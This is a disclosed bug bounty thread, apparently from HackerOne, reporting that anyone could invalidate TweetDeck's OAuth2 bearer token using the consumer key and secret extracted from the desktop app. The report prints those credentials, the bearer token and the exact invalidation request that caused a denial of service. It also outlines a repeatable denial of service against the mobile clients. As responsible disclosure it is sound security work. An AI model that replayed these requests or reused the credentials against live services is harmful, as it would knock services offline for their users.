[Urgent] Invalidating OAuth2 Bearer token makes TweetDeck unavailable

    Share:

Timeline
filedescriptor
submitted a report to Twitter.
Mar 4th (6 years ago)
First of all, really sorry for the unintentional DoS :( I was testing it with a fresh bearer token but copied the production one accidentally.
Details
I've noticed that TweetDeck is using OAuth2 to issue requests (Authorization Bearer token):
Code 727 BytesWrap lines Copy Download
GET https://api.twitter.com/1.1/help/settings.json?settings_version= HTTP/1.1
Host: api.twitter.com
Connection: keep-alive
Authorization: Bearer AAAAAAAAAAAAAAAAAAAAAF7aAAAAAAAAi95Q2QkUrMfOxflMJIWoZ3JcvJw%3DOLBx5qSvcDbL37ad9Moq9MtZN2yYQ0r6zKtIupfa5AEbVAoZnM
Origin: https://tweetdeck.twitter.com
X-Csrf-Token: 2170b7f455955368495bc191ed67c892
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/plain, */*; q=0.01
X-Twitter-Auth-Type: OAuth2Session
X-Twitter-Client-Version: Twitter-TweetDeck-blackbird-chrome/4.0.170302174617 web/
Referer: https://tweetdeck.twitter.com/
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: en-US,en;q=0.8
According to the documentation, with a valid consumer key and consumer secret pair, one can generate or invalidate existing bearer token: https://dev.twitter.com/oauth/reference/post/oauth2/invalidate/token
Now, it can be guessed that the hardcoded bearer token used in TweetDeck belongs to the TweetDeck client. The consumer key and consumer secret can be extracted from the desktop application:
Code 99 BytesWrap lines Copy Download
Consumer key:    yT577ApRtZw51q4NPMPPOQ
Consumer secret: 3neq3XqN5fO3obqwZoajavGFCUrC42ZfbrLXy5sCv8
Apparently, anyone can invalidate the bearer token while issuing token invalidation request:
Code 402 BytesWrap lines Copy Download
POST https://api.twitter.com/oauth2/invalidate_token HTTP/1.1
Authorization: Basic eVQ1NzdBcFJ0Wnc1MXE0TlBNUFBPUTozbmVxM1hxTjVmTzNvYnF3Wm9hamF2R0ZDVXJDNDJaZmJyTFh5NXNDdjg=
Host: api.twitter.com
Content-Length: 125
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

access_token=AAAAAAAAAAAAAAAAAAAAAF7aAAAAAAAAi95Q2QkUrMfOxflMJIWoZ3JcvJw%3DOLBx5qSvcDbL37ad9Moq9MtZN2yYQ0r6zKtIupfa5AEbVAoZnM
And suddenly all the requests on TweetDeck result in {"errors":[{"code":89,"message":"Invalid or expired token."}]}.
andrewsorensen
 changed the status to Triaged. 
Mar 4th (6 years ago)
Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.
Thank you for helping keep Twitter secure!
filedescriptor
 posted a comment. 
Updated Mar 4th (6 years ago)
I suspect other services could potential have the same issues. For example mobile.twitter.com is also using the same way to establish API connections. Fix-wise I wonder if forbidding bearer token invalidation on official clients is enough.
andrewsorensen
 posted a comment. 
Mar 4th (6 years ago)
Hi filedescriptor,
Thanks for the information. While we investigate this issue and fix the bearer token for tweetdeck.twitter.com please don't try to revoke any other OAuth bearer tokens until this report has been closed out. We'll take the full impact of this issue into consideration when we award a bounty.
Thanks for thinking of Twitter security!
filedescriptor
 posted a comment. 
Updated Mar 4th (6 years ago)
I stopped all my testings immediately after I realized the consequence so yeah I won't.
andrewsorensen
 posted a comment. 
Mar 4th (6 years ago)
Thanks. We've restored TweetDeck but are still looking into the issue of being able to invalidate the bearer token.
filedescriptor
 posted a comment. 
Updated Mar 6th (6 years ago)
I also noticed mobile Twitter clients depend on a similar way (for the xAuth part) but they generate a new bearer token every time.
According to the documentation: https://dev.twitter.com/oauth/reference/post/oauth2/token

    Only one bearer token may exist outstanding for an application, and repeated requests to this method will yield the same already-existent token until it has been invalidated.

So technically they are always the same until being invalidated (and that explains why I accidentally DoS'd TweetDeck despite using a fresh token which was actually the same as the production one)
Moving on:

    [..] If attempted too frequently, requests will be rejected with a HTTP 403 with code 99

So an attacker could in theory keep creating and invalidating the bearer token for the mobile Twitter clients and achieve DoS there.
PS. Of course I didn't try it.
Twitter  rewarded filedescriptor with a $5,040 bounty. 
Mar 17th (6 years ago)
Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.
andrewsorensen
 closed the report and changed the status to Resolved. 
Jun 28th (5 years ago)
We consider this issue to be fixed now. Can you please confirm?
Thank you for helping keep Twitter secure!
filedescriptor
 posted a comment. 
Updated Jun 28th (5 years ago)
I'm not sure how to retest it as it might make certain services unavailable again. How do you think I should proceed?
filedescriptor
 posted a comment. 
Jul 4th (5 years ago)
Pinging again
andrewsorensen
 posted a comment. 
Jul 5th (5 years ago)
Understood. We believe this issue is fixed so testing should not have any impact. However, testing with a test application (where possible) instead of a production application would be preferred.
filedescriptor
 posted a comment. 
Updated Jul 5th (5 years ago)
I believe the consumer secret for TweetDeck has been rotated, and other official clients have rejected invalidation requests: {"errors":[{"code":348,"message":"Client application is not permitted to to invalidate this token."}]}. I think it's fixed.
filedescriptor
 requested to disclose this report. 
Jul 5th (5 years ago)
swilson
Twitter staff  posted a comment. 
Jul 7th (5 years ago)
@filedescriptor would like to request we hold off publishing for now. As a part of the clean up after the issue was discovered, we found the scope is larger than just TD. I want to wait and get the remaining updated and then give the all clear to publish if thats ok?
swilson
Twitter staff  reopened this report. 
Jul 7th (5 years ago)
Reopening report as scope is more than just TD. Also re-opened JIRA ticket.
filedescriptor
 posted a comment. 
Jul 7th (5 years ago)
No problem at all
andrewsorensen
 closed the report and changed the status to Resolved. 
Apr 5th (4 years ago)
We consider this issue to be fixed now. Our documentation now clearly calls out the repercussions of having OAuth credentials that are public and how that allows requests to be made on behalf of the application.
Thank you for helping keep Twitter secure!
acamacho
Twitter staff  posted a comment. 
Apr 8th (4 years ago)
@filedescriptor just wanted to checkin with you about the disclosure, did you want to proceed or cancel out the disclosure request? 
filedescriptor
 requested to disclose this report. 
Apr 16th (4 years ago)
Let's disclose it!
acamacho
Twitter staff  agreed to disclose this report. 
Apr 25th (4 years ago)
 This report has been disclosed. 
